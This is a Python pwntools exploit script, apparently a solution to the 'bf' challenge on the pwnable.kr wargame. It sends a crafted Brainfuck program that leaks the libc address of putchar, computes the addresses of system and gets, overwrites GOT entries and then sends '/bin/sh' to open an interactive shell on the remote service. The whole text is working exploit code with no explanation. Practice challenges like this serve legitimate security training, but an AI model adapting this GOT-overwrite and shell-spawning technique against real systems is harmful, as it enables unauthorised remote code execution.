from pwn import *
#ihciah@gmail.com
libc = ELF('bf_libc.so')
bf = remote('pwnable.kr', 9001)
bf.recvline_startswith('type')
bf.sendline('<'*112+'.'+'.>'*4+'<'*4+',>'*4+'<'*(4+32)+',>'*4+'<'*4+'>'*28+',>'*4+'.')
bf.recv(1)
x=bf.recv(4)[::-1]
print("x")
print(x)
jump=0x080484E0
bf.send(p32(jump))

print("system symbol:")
print(libc.symbols['system'])

print("putchar symbol:")
print(libc.symbols['putchar'])

print("gets symbol:")
print(libc.symbols['gets'])

system=int(x.encode('hex'),16)-libc.symbols['putchar']+libc.symbols['system']
gets=int(x.encode('hex'),16)-libc.symbols['putchar']+libc.symbols['gets']
print("system")
print(system)
print("p32(system)")
print(p32(system))

print("gets")
print(gets)
print("p32(gets)")
print(p32(gets))


bf.send(p32(system))
bf.send(p32(gets))
bf.sendline('/bin/sh\x00')
bf.interactive()

